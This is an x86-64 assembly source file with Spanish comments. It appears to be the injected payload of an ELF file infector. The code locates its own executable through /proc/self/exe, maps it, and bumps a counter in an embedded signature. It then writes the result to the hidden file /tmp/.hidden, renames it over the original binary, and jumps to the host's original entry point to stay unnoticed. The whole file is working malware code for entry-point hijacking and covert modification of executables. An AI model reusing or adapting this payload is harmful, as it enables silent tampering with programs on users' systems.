section .text
global _ft_payload

_ft_payload:
    jmp     code_start

data_start:
entry_delta:    dq 0xDEADBEEF               ; offset 2  (EP_orig - new_vaddr)
sig_offset:     dq 0xDEADBEEF               ; offset 10 (offset de la firma en el fichero)
use_gap_flag:   dq 0xDEADBEEF               ; offset 18 (1 = hueco, 0 = PT_NOTE)
path_self:      db "/proc/self/exe", 0      ; offset 26
path_temporal:  db "/tmp/.hidden", 0        ; offset 41

code_start:
    push    rbx
    push    rbp
    push    r12
    push    r13
    push    r14
    push    r15
    push    rdx

    call    .get_base
.get_base:
    pop     rbx
    sub     rbx, (.get_base - _ft_payload)  ; rbx = base real del payload

    sub     rsp, 1056

    ; 1. readlink (/proc/self/exe)
    mov     rax, 89
    lea     rdi, [rbx + (path_self - _ft_payload)]
    mov     rsi, rsp
    mov     rdx, 1024
    syscall
    cmp     rax, 0
    jl      .restore_stack
    mov     byte [rsp + rax], 0

    ; 2. Comprobar si estamos en el hueco o en el PT_NOTE
    mov     rax, [rbx + 18]             ; use_gap_flag
    cmp     rax, 1
    je      .gap_mode
    jmp     .note_mode

.gap_mode:
    ; === MODO HUECO: fork + hijo hace open(O_RDONLY) + mmap(MAP_PRIVATE) + archivo temporal + rename ===
    mov     rax, 57
    syscall
    cmp     rax, 0
    jl      .restore_stack
    jnz     .restore_stack          ; padre → _start original

    ; === HIJO ===
    ; 1. open(path, O_RDONLY) -> Evita ETXTBSY
    mov     rax, 2
    mov     rdi, rsp
    xor     rsi, rsi                ; O_RDONLY
    xor     rdx, rdx
    syscall
    cmp     rax, 0
    jl      .gap_child_exit
    mov     r14, rax                ; r14 = fd original

    ; 2. lseek(fd, 0, SEEK_END) → file_size
    mov     rax, 8
    mov     rdi, r14
    xor     rsi, rsi
    mov     rdx, 2
    syscall
    mov     r15, rax                ; r15 = file_size

    ; 3. mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0)
    mov     rax, 9
    xor     rdi, rdi
    mov     rsi, r15
    mov     rdx, 3                  ; PROT_READ | PROT_WRITE
    mov     r10, 2                  ; MAP_PRIVATE
    mov     r8, r14
    xor     r9, r9
    syscall
    cmp     rax, -1
    je      .gap_child_close
    mov     r13, rax                ; r13 = mmap address

    ; 4. Modificar el contador de 7 dígitos al final de la firma
    mov     rdi, [rbx + 10]         ; sig_offset
    add     rdi, r13                ; mmap + sig_offset

    ; Buscar el último guion '-' hacia atrás
    lea     rdx, [rdi + 50]
    mov     rcx, 60
.find_dash:
    cmp     byte [rdx], '-'
    je      .found_dash
    dec     rdx
    loop    .find_dash
    jmp     .gap_munmap

.found_dash:
    add     rdx, 2                  ; apunta al primer dígito del contador
    push    rdx
    xor     r12, r12
    mov     rcx, 7                  ; 7 dígitos
.conv_num:
    movzx   eax, byte [rdx]
    sub     eax, '0'
    imul    r12, r12, 10
    add     r12, rax
    inc     rdx
    loop    .conv_num

    inc     r12                     ; Incrementar contador

    pop     rdi
    add     rdi, 6                  ; apuntar al último dígito
    mov     rax, r12
    mov     rcx, 7
.conv_str:
    xor     rdx, rdx
    mov     r8, 10
    div     r8
    add     dl, '0'
    mov     [rdi], dl
    dec     rdi
    loop    .conv_str

    ; 5. open archivo temporal (/tmp/.hidden)
    mov     rax, 2
    lea     rdi, [rbx + (path_temporal - _ft_payload)]
    mov     rsi, 0x241              ; O_WRONLY|O_CREAT|O_TRUNC
    mov     rdx, 0x1ed              ; 0755
    syscall
    cmp     rax, 0
    jl      .gap_munmap
    mov     r12, rax                ; r12 = fd temporal

    ; 6. write contenido modificado al temporal
    mov     rax, 1
    mov     rdi, r12
    mov     rsi, r13
    mov     rdx, r15
    syscall

    ; 7. close temporal
    mov     rax, 3
    mov     rdi, r12
    syscall

.gap_munmap:
    ; 8. munmap
    mov     rax, 11
    mov     rdi, r13
    mov     rsi, r15
    syscall

.gap_child_close:
    ; 9. close original
    mov     rax, 3
    mov     rdi, r14
    syscall

    ; 10. rename temporal sobre el path original
    mov     rax, 82
    lea     rdi, [rbx + (path_temporal - _ft_payload)]
    mov     rsi, rsp
    syscall

.gap_child_exit:
    mov     rax, 60
    xor     rdi, rdi
    syscall

.note_mode:
    ; === MODO PT_NOTE: mmap MAP_PRIVATE + escribir a /tmp/.hidden + rename (como antes) ===

    ; open(path, O_RDONLY)
    mov     rax, 2
    mov     rdi, rsp
    xor     rsi, rsi                ; O_RDONLY
    xor     rdx, rdx
    syscall
    cmp     rax, 0
    jl      .restore_stack
    mov     r14, rax                ; r14 = fd

    ; lseek(fd, 0, SEEK_END) → file_size
    mov     rax, 8
    mov     rdi, r14
    xor     rsi, rsi
    mov     rdx, 2
    syscall
    mov     r15, rax                ; r15 = file_size

    ; mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0)
    mov     rax, 9
    xor     rdi, rdi
    mov     rsi, r15
    mov     rdx, 3                  ; PROT_READ | PROT_WRITE
    mov     r10, 2                  ; MAP_PRIVATE
    mov     r8, r14
    xor     r9, r9
    syscall
    cmp     rax, -1
    je      .note_close
    mov     r13, rax                ; r13 = mmap address

    ; Modificar el fingerprint en el mapeo
    mov     rdi, [rbx + 10]         ; sig_offset
    add     rdi, r13                ; mmap + sig_offset
    add     rdi, 30                 ; apuntar al '2' de 2026 (o al primer dígito)

    push    rdi
    xor     r12, r12
    mov     rcx, 4
.note_conv_num:
    movzx   eax, byte [rdi]
    sub     eax, '0'
    imul    r12, r12, 10
    add     r12, rax
    inc     rdi
    loop    .note_conv_num

    inc     r12

    pop     rdi
    add     rdi, 3
    mov     rax, r12
    mov     rcx, 4
.note_conv_str:
    xor     rdx, rdx
    mov     r8, 10
    div     r8
    add     dl, '0'
    mov     [rdi], dl
    dec     rdi
    loop    .note_conv_str

    ; open temporal file
    mov     rax, 2
    lea     rdi, [rbx + (path_temporal - _ft_payload)]
    mov     rsi, 0x241              ; O_WRONLY|O_CREAT|O_TRUNC
    mov     rdx, 0x1ed              ; 0755
    syscall
    cmp     rax, 0
    jl      .note_munmap
    mov     r12, rax

    ; write infected content to temporal file
    mov     rax, 1
    mov     rdi, r12
    mov     rsi, r13
    mov     rdx, r15
    syscall

    ; fsync
    mov     rax, 74
    mov     rdi, r12
    syscall

    ; close temporal file
    mov     rax, 3
    mov     rdi, r12
    syscall

    ; chmod temporal file
    mov     rax, 90
    lea     rdi, [rbx + (path_temporal - _ft_payload)]
    mov     rsi, 0x1ed
    syscall

.note_munmap:
    ; munmap(mmap, size)
    mov     rax, 11
    mov     rdi, r13
    mov     rsi, r15
    syscall

.note_close:
    ; close(fd)
    mov     rax, 3
    mov     rdi, r14
    syscall

    ; rename temporal file over original path
    mov     rax, 82
    lea     rdi, [rbx + (path_temporal - _ft_payload)]
    mov     rsi, rsp
    syscall

    jmp     .restore_stack

.restore_stack:
    add     rsp, 1056

    pop     rdx
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    pop     rbx

    call    .get_ip
.get_ip:
    pop     rax
    sub     rax, (.get_ip - _ft_payload)
    mov     rcx, [rax + 2]
    add     rax, rcx
    jmp     rax